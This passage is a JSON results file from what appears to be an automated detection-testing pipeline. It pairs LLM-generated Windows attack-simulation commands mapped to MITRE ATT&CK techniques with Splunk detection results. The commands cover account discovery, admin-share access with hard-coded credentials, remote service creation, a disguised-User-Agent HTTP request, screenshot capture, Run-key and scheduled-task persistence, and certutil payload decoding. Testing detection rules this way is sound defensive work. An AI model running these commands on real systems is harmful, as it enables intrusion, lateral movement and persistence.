      "command": "net localgroup Administrators",
      "description": "List members of the local Administrators group to identify privileged accounts",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Displays the list of users and groups that are members of the local Administrators group. Requires elevated privileges to execute successfully.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:02.598710",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1311f087-bc5f-4683-8bf3-5b69dd661665",
      "ttp_id": "unknown",
      "technique_id": "T1087.001",
      "technique_name": "Account Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $users = Get-WmiObject -Class Win32_UserAccount -Filter \\\"LocalAccount='True'\\\" -ErrorAction Stop; $users | Select-Object Name, SID, Disabled, Lockout, PasswordRequired | ConvertTo-Json } catch { Write-Error \\\"WMI query failed\\\" }\"",
      "description": "Use WMI via PowerShell to retrieve detailed information about local user accounts with JSON output",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Queries WMI for all local user accounts and outputs structured data including Name, SID, and account status flags. Runs without admin rights but provides more detail than 'net user'.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:02.598710",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2259a39b-8649-4e09-a9b0-e3bb27a6896e",
      "ttp_id": "unknown",
      "technique_id": "T1021",
      "technique_name": "Remote Services",
      "tactic": "execution",
      "platform": "windows",
      "command": "net.exe use \\\\10.0.0.100\\C$ /user:admin P@ssw0rd",
      "description": "Map a network drive using Windows 'net use' to access a remote administrative share with credentials",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Establishes a connection to a remote C$ share using provided credentials. No output if successful; may prompt for credentials if they fail.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:03.554799",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b6eaaf7d-149f-4280-a409-6a0c8d4d7ce0",
      "ttp_id": "unknown",
      "technique_id": "T1021",
      "technique_name": "Remote Services",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc.exe \\\\10.0.0.100 create EvilService binPath= \"cmd.exe /c whoami > %TEMP%\\svc.txt\" start= auto",
      "description": "Create a service on a remote machine using 'sc.exe' to execute a benign command",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a service named 'EvilService' on the remote host. The service runs 'whoami' and writes output to %TEMP%\\svc.txt when started. Requires elevated privileges and remote service management access.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:03.554799",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d9cd1fa0-b338-4a91-929f-1ac949d45c0d",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Remote Services",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $wc = New-Object Net.WebClient; $wc.Headers.Add('User-Agent', 'Mozilla/5.0'); $wc.DownloadString('http://10.0.0.100/get?id=123') | Out-Null } catch { }\"",
      "description": "Use PowerShell to make a stealthy HTTP GET request to a remote server with custom User-Agent",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends an HTTP GET request to the specified URL with a spoofed User-Agent. Silently fails on network errors. Does not download or execute payloads; only retrieves data.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:03.554799",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4545e4dd-b0f4-4cd5-b135-01c7d5aa2fa9",
      "ttp_id": "unknown",
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen(0,0,0,0,$bmp.Size); $path = \\\"$env:TEMP\\\\screenshot.bmp\\\"; $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Bmp); Write-Host 'Screenshot captured to $path'\"",
      "description": "Captures the primary display screen using .NET APIs and saves the bitmap to %TEMP%\\screenshot.bmp.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A BMP file named screenshot.bmp is created in the user's temporary directory containing a snapshot of the current screen.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:06.232728",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "385a0b02-e3c1-4d61-a740-4e150199a3f9",
      "ttp_id": "unknown",
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen(0,0,0,0,$bmp.Size); $path = \\\"$env:TEMP\\\\screenshot.bmp\\\"; $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Bmp); Compress-Archive -Path $path -DestinationPath \\\"$env:TEMP\\\\screenshot.zip\\\" -Force; Write-Host 'Screenshot archived to $env:TEMP\\\\screenshot.zip'; Remove-Item $path -ErrorAction SilentlyContinue\"",
      "description": "Captures a screenshot, saves it as a BMP, then compresses the file into a ZIP archive using the built\u2011in Compress-Archive cmdlet.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates screenshot.bmp, compresses it to screenshot.zip in %TEMP%, then deletes the original BMP. The ZIP contains the screen capture.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:06.233836",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c3b21a0c-c526-4d6b-bfde-35fac46fad10",
      "ttp_id": "unknown",
      "technique_id": "T1113",
      "technique_name": "Screen Capture",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen(0,0,0,0,$bmp.Size); $path = \\\"$env:TEMP\\\\screenshot.bmp\\\"; $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Bmp); $bytes = [System.IO.File]::ReadAllBytes($path); $b64 = [System.Convert]::ToBase64String($bytes); Set-Content -Path \\\"$env:TEMP\\\\screenshot.b64\\\" -Value $b64 -Encoding ASCII; certutil -decode \\\"$env:TEMP\\\\screenshot.b64\\\" \\\"$env:TEMP\\\\screenshot_decoded.bmp\\\"; Write-Host 'Screenshot captured, base64\u2011encoded and decoded back to BMP'; Remove-Item $path, \\\"$env:TEMP\\\\screenshot.b64\\\" -ErrorAction SilentlyContinue\"",
      "description": "Captures a screenshot, encodes the BMP to Base64, writes the Base64 string to a temporary file, then uses certutil to decode it back to a BMP file.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates screenshot.bmp, a Base64 text file screenshot.b64, then decodes it to screenshot_decoded.bmp in %TEMP%. The final BMP matches the original capture.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:06.233836",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6ce5e361-a9bb-4e21-8e97-45fd370cbee0",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Registry Run Keys",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v TestRun /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f",
      "description": "Adds a Run key under the current user hive that launches Notepad on user logon. Uses the built\u2011in reg.exe utility and does not require elevated privileges.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates the registry value HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TestRun with data \"C:\\Windows\\System32\\notepad.exe\". Notepad will start automatically the next time the user logs on.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:07.297771",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "10fce6a9-d2b0-4318-a845-960ad1a89cce",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Registry Run Keys",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v EvilRun /t REG_SZ /d \"%TEMP%\\dummy.exe\" /f",
      "description": "Creates a machine\u2011wide Run key that points to a dummy executable in the temporary folder. This requires administrative rights because it writes to HKLM.",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Adds the registry value HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EvilRun with data \"%TEMP%\\dummy.exe\". Any executable placed at that path will be launched for all users at logon.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:07.297771",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "49fa4d2d-4257-4f05-9c95-c88d1c350c47",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Registry Run Keys",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'AdvRun' -Value 'C:\\Windows\\System32\\mspaint.exe' -PropertyType String -Force\"",
      "description": "Uses PowerShell to create a Run key under the current user hive that launches MS Paint on logon. No admin rights are needed; PowerShell is used because the operation is more concise than reg.exe for this example.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates the registry entry HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AdvRun with the value \"C:\\Windows\\System32\\mspaint.exe\". MS Paint will start automatically the next time the user logs on.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:07.297771",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "00fa8ef5-79a7-4da4-95fe-f6a3c7d3234c",
      "ttp_id": "unknown",
      "technique_id": "T1021.001",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "mstsc.exe /v:192.168.1.10",
      "description": "Launches the built\u2011in Remote Desktop client (mstsc) to connect to the target host at 192.168.1.10 using the default credentials of the current user.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The RDP client UI opens and attempts to establish a TCP connection to 192.168.1.10 on port 3389. No changes are made to the system.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:08.230488",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "467b7b9c-039c-42be-9e18-e90e3afd56ab",
      "ttp_id": "unknown",
      "technique_id": "T1021.001",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmdkey /generic:\"TERMSRV/192.168.1.10\" /user:\"testuser\" /pass:\"P@ssw0rd\" && mstsc.exe /v:192.168.1.10",
      "description": "Stores credentials for the remote RDP service using cmdkey, then launches mstsc to connect using those credentials.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The credentials are cached locally for the target RDP server, and mstsc initiates a connection to 192.168.1.10. No files are written to disk and no privileged actions are performed.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:08.230488",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6b9f8096-5430-4619-83bb-80049a552c82",
      "ttp_id": "unknown",
      "technique_id": "T1021.001",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$rdp = @'\\nfull address:s:192.168.1.10\\nusername:s:testuser\\n'@; $path = \\\"$env:TEMP\\\\temp.rdp\\\"; Set-Content -Path $path -Value $rdp -Encoding Unicode; mstsc.exe $path\"",
      "description": "Creates a temporary .rdp file in the %TEMP% directory with a hard\u2011coded target and username, then launches mstsc to use that file for the connection.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A temporary RDP configuration file is written to the user's temp folder, containing the target address and username. mstsc reads this file and attempts to connect to the specified host. The file is left in %TEMP% for cleanup after testing.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:08.230488",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4f2d059f-315b-48ce-8ac2-2a1fd9430878",
      "ttp_id": "unknown",
      "technique_id": "T1566.001",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo Test file created > %TEMP%\\phish_test.txt\"",
      "description": "Simulates a macro in WINWORD.EXE launching cmd.exe to create a benign file in the temporary directory. This matches the detection of Office spawning a command\u2011line process.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A new file named phish_test.txt containing the text \"Test file created\" is written to the user's %TEMP% folder.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:09.174448",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f35d89ce-54d7-48cd-b408-c959e448588b",
      "ttp_id": "unknown",
      "technique_id": "T1566.001",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"certutil -decode $env:TEMP\\payload.b64 $env:TEMP\\payload.exe\"",
      "description": "Represents a macro\u2011triggered PowerShell execution that decodes a base64\u2011encoded payload using the built\u2011in certutil utility. No external network access is required; the payload files reside in %TEMP%.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "If a file named payload.b64 exists in %TEMP%, certutil will decode it to payload.exe in the same directory. The command itself is harmless when the input file is absent.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:09.174448",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "da8b89b1-e522-4f04-9878-6a0e31e452cc",
      "ttp_id": "unknown",
      "technique_id": "T1566.001",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c echo Advanced test > $env:TEMP\\adv.txt'; $trigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName 'OfficeLaunch' -Action $action -Trigger $trigger -RunLevel Highest -Force\"",
      "description": "Demonstrates a more advanced post\u2011macro scenario where PowerShell creates a scheduled task that runs cmd.exe at logon, writing a file to %TEMP%. This mimics persistence techniques often observed after malicious Office macro execution.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A scheduled task named 'OfficeLaunch' is registered to run at user logon. When triggered, it executes cmd.exe to create adv.txt in %TEMP% with the text \"Advanced test\". The task requires administrative privileges to register.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:25:09.174448",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "801637e7-544f-49c3-b142-757d70c7bae0",
      "attack_id": "982ca9ab-9d09-42d1-93ac-075916fd3736",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 463.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "875e7826-72a4-4f00-bf6d-2b0d61fe38fd",
      "attack_id": "85b59348-54e5-4c39-9bf3-e7190fad52f6",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 461.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "e8ba782e-52af-48a2-9041-7722ff3b0b52",
      "attack_id": "dcfef2e7-4123-414e-b166-7a7f9b2b3c39",
      "detected": true,
      "events_found": 8,
      "historical_events": 0,
      "query_time_ms": 460.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "6005777b-4036-4ba2-9ab3-48b3d38538b0",
      "attack_id": "aef2dec4-da50-4dc6-82fd-b07e240e5d2d",
      "detected": true,
      "events_found": 12,
      "historical_events": 0,
      "query_time_ms": 516.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "b2a8415c-6a89-48a1-8eed-804b83071778",
      "attack_id": "f3bc68eb-cc55-47ee-b491-12e1b9f08346",
      "detected": true,
      "events_found": 10,
      "historical_events": 0,
      "query_time_ms": 901.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "1f4109c7-5058-49a3-8bc2-039e9714c780",
      "attack_id": "90757aa6-863f-4577-bc1e-1f17046d845d",
      "detected": true,
      "events_found": 10,
      "historical_events": 0,
      "query_time_ms": 615.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "0be85fc8-fbb9-4130-8f57-044da7a8e83c",
      "attack_id": "e076c44a-21d9-475a-ad39-897094d1c2eb",
      "detected": true,
      "events_found": 8,
      "historical_events": 0,
      "query_time_ms": 464.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "dd2ea64d-3167-4009-aebf-f0f6ff8c1d06",
      "attack_id": "3433ad04-faf5-4f26-a2ec-470c9fbed963",
      "detected": true,
      "events_found": 8,
      "historical_events": 0,
      "query_time_ms": 458.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "422a931a-f258-4f1c-904d-96cd0d801d18",
      "attack_id": "efb05504-f9c3-48cf-b8ab-7253d7acf684",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 769.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "afc27d9a-59ec-4ad5-949a-bcc1abe5b78f",
      "attack_id": "cf2037e5-943a-4f76-be2b-976957f912c4",
      "detected": true,
      "events_found": 14,
      "historical_events": 0,
      "query_time_ms": 647.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "90e8f8e4-5d00-4e96-9de4-2364efc8729a",
      "attack_id": "45b11198-5ce8-47b8-b110-59d942ac8e74",
      "detected": true,
      "events_found": 2,
      "historical_events": 0,
      "query_time_ms": 532.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "ba01febb-e92b-4942-8884-c6c3da33a2b7",
      "attack_id": "d2901917-ceac-45b9-b5f7-90352b0754c4",
      "detected": true,
      "events_found": 2,
      "historical_events": 0,
      "query_time_ms": 446.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "d8be6cb7-8e22-47ea-8bdf-b248674a24fd",
      "attack_id": "ecab5c20-15d3-4db3-b041-282997bd7855",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 485.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "2198544a-0942-4b97-b993-07ee86cc6007",
      "attack_id": "38a9f235-4b99-4c25-940c-99ef9c636d66",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 465.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "20a883b3-e877-4a3d-b607-304f7afd4327",
      "attack_id": "7858302c-ae18-4163-941b-553fdb86af2f",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 476.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "ef8b9b42-52aa-468c-a4cb-58f2cb722ded",
      "attack_id": "6b6afe65-cd7c-4223-b499-a3b7f9ee9c47",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 436.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "cbac0f24-312d-4d99-909d-a6682649f5d1",
      "attack_id": "77b6a89f-d5c2-4464-aa18-e29115305c74",
      "detected": true,
      "events_found": 20,
      "historical_events": 0,
      "query_time_ms": 579.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "3f0da8c0-a933-4743-8030-2a5e8f7610ac",
      "attack_id": "f2ee3e17-fe5d-40eb-b1aa-4c95a33f4b85",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 462.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "b5eef6f0-3ea2-4d77-88ad-0ef01c1674be",
      "attack_id": "18321de8-1b90-4496-b630-f662a6791ac3",
      "detected": true,
      "events_found": 18,
      "historical_events": 0,
      "query_time_ms": 534.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "de634769-0ad0-4dc7-9efd-c4b2451a4dae",
      "attack_id": "f435e2ff-1a70-4c72-9fe9-14b3a6bd445a",
      "detected": true,
      "events_found": 12,
      "historical_events": 0,
      "query_time_ms": 577.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "c15b8683-9112-4956-b787-22f720eab586",
      "attack_id": "e543c5d4-ccd4-4d32-825f-b6962a2ca3b9",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Invalid SPL: Unbalanced quotes."
    },
    {
      "rule_id": "f2f48975-4051-4c1c-9a8c-681e0c91beba",
      "attack_id": "048a062e-ab07-42e6-9410-42d4f1f88395",
      "detected": true,
      "events_found": 12,
      "historical_events": 0,
      "query_time_ms": 465.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "d5b72332-c8be-4e2f-a7a3-ce480d0a6a0c",
      "attack_id": "9ea045c8-0008-455a-9bf9-0fa4535d133e",
      "detected": true,
      "events_found": 6,
      "historical_events": 0,
      "query_time_ms": 511.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "eae662db-b034-4600-b6aa-add381110be0",
      "attack_id": "939e5598-ba6a-40da-9a8c-63db3c604607",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 503.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "3b66dcce-f412-484e-b6a5-cec788fd31d2",
      "attack_id": "18a149f5-5bfe-4007-99ab-a0650713d78e",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 436.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "252ef574-c8c7-4ae7-8b11-8a56839c80d2",
      "attack_id": "302734ce-dd72-42a1-8af8-058c09930f40",
      "detected": true,
      "events_found": 10,
      "historical_events": 0,
      "query_time_ms": 418.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "4549a407-0835-434b-888c-9513ba152441",
      "attack_id": "eeb4a750-e801-466b-8f3f-778800ce9f72",
      "detected": true,
      "events_found": 4,
      "historical_events": 0,
      "query_time_ms": 484.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "c21eb8ea-f6a3-4be5-8aea-aa2ff90b7bd3",
      "attack_id": "e1ac8390-2bdb-4b24-8dc1-447cda697567",
      "detected": true,
      "events_found": 14,
      "historical_events": 0,
      "query_time_ms": 567.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "65fb4ceb-8d95-4068-a7b7-d7dae60edc45",
      "attack_id": "fe6f94e6-1e24-4376-9939-c8014f82d1c2",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 529.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "646367a9-d1a5-4725-9274-7730813d38e0",
      "attack_id": "8b4d9947-e782-4dfc-bca4-6846e5b7c237",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 518.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "18f0a0c9-06c2-4556-94e1-0fb1ac849385",
      "attack_id": "b327b029-52bb-4876-9521-2ea6ecef54b0",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 478.00000000000006,
      "status": "success",
      "message": "Verification complete"
    }
  ],
  "siem_metrics": {
    "true_positives": 17,
    "false_positives": 0,
    "false_negatives": 14,
    "true_negatives": 0,
    "precision": 1.0,
    "recall": 0.5483870967741935,
    "f1_score": 0.7083333333333333,
    "accuracy": 0.5483870967741935,
    "detection_rate": 0.5483870967741935,
    "false_positive_rate": 0.0
  },
  "iterations": 3,
  "final_score": 0.624,
  "timestamp": "2025-12-22T02:19:21.268218"
}